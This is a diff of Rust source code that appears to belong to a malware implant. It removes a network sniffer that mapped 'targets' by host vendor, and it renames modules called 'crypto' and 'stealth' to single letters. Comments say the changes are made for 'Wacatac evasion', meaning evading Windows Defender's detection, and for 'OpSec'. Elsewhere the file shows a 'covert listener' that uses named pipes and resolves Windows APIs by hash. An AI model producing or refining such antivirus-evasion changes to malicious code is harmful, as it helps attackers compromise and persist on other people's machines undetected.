@@ -1,15 +1,11 @@
-use pnet::datalink::{self, Channel};
-use pnet::packet::Packet;
-use pnet::packet::ethernet::{EthernetPacket, EtherTypes};
-use pnet::packet::ipv4::Ipv4Packet;
-use pnet::packet::udp::UdpPacket;
+// pnet imports removed for Wacatac evasion
 use std::collections::HashMap;
 use std::time::{Instant, Duration};
 use std::sync::{Arc, Mutex};
 use log::{info, warn};
 use rand::Rng;
 
-use crate::crypto::{handshake_magic, handshake_xor, handshake_magic_prev, handshake_xor_prev};
+use crate::c::{handshake_magic, handshake_xor, handshake_magic_prev, handshake_xor_prev};
 
 // OUI Constants (Allowed: Intel, Realtek, Microsoft)
 const ALLOWED_OUIS: &[&[u8; 3]] = &[
@@ -328,7 +324,7 @@ async fn start_covert_listener() {
     use std::fs::File;
     use std::os::windows::io::FromRawHandle;
     use std::io::{Read, Write};
-    use crate::stealth::windows::api_resolver::{self, resolve_api, 
+    use crate::s::windows::api_resolver::{self, resolve_api, 
         HASH_KERNEL32, HASH_CREATE_NAMED_PIPE_A, HASH_CONNECT_NAMED_PIPE, 
         HASH_CLOSE_HANDLE, HASH_GET_LAST_ERROR};
 
@@ -440,69 +436,7 @@ async fn start_covert_listener() {
     }
 }
 
-fn start_sniffer(map: Arc<Mutex<HashMap<String, TargetInfo>>>) {
-    // Select interface (dumb selection for now: first non-loopback)
-    let interfaces = datalink::interfaces();
-    let interface = interfaces.into_iter()
-        .filter(|iface| !iface.is_loopback() && iface.is_up() && !iface.ips.is_empty())
-        .next();
-
-    if let Some(iface) = interface {
-        info!("[Stealth] Sniffing on Interface: {}", iface.name);
-        
-        let (_, mut rx) = match datalink::channel(&iface, Default::default()) {
-            Ok(Channel::Ethernet(tx, rx)) => (tx, rx),
-            Ok(_) => { warn!("Unhandled Channel Type"); return; },
-            Err(e) => { warn!("Failed to create channel: {}", e); return; }
-        };
-
-        loop {
-            match rx.next() {
-                Ok(packet) => {
-                    let eth = match EthernetPacket::new(packet) {
-                        Some(e) => e,
-                        None => continue,
-                    };
-                    if eth.get_ethertype() == EtherTypes::Ipv4 {
-                        if let Some(ip_packet) = Ipv4Packet::new(eth.payload()) {
-                            // Filter UDP Broadcasts
-                            if ip_packet.get_next_level_protocol() == pnet::packet::ip::IpNextHeaderProtocols::Udp {
-                                if let Some(udp) = UdpPacket::new(ip_packet.payload()) {
-                                    let dest_port = udp.get_destination();
-                                    if FILTER_PORTS.contains(&dest_port) {
-                                        let src_ip = ip_packet.get_source().to_string();
-                                        let src_mac = eth.get_source().octets();
-
-                                        let oui: [u8; 3] = [src_mac[0], src_mac[1], src_mac[2]];
-                                        let oui_allowed = ALLOWED_OUIS.iter().any(|allowed| **allowed == oui);
-                                        if !oui_allowed {
-                                            continue;
-                                        }
-
-                                        let mut map_lock = match map.lock() {
-                                            Ok(m) => m,
-                                            Err(_) => continue,
-                                        };
-                                        let entry = map_lock.entry(src_ip.clone()).or_insert(TargetInfo {
-                                            ip: src_ip,
-                                            mac: src_mac,
-                                            last_seen: Instant::now(),
-                                            hits: 0,
-                                        });
-                                        entry.last_seen = Instant::now();
-                                        entry.hits += 1;
-                                        
-                                        // debug!("[Stealth] Shadow Map Updated: {} (Hits: {})", entry.ip, entry.hits);
-                                    }
-                                }
-                            }
-                        }
-                    }
-                },
-                Err(_) => continue,
-            }
-        }
-    } else {
-        warn!("[Stealth] No suitable interface found for sniffing.");
-    }
+fn start_sniffer(_map: Arc<Mutex<HashMap<String, TargetInfo>>>) {
+    // Sniffer disabled to remove pnet dependency (Wacatac Evasion)
+    warn!("[Stealth] Packet Sniffer disabled for OpSec reasons (pnet removal).");
 }
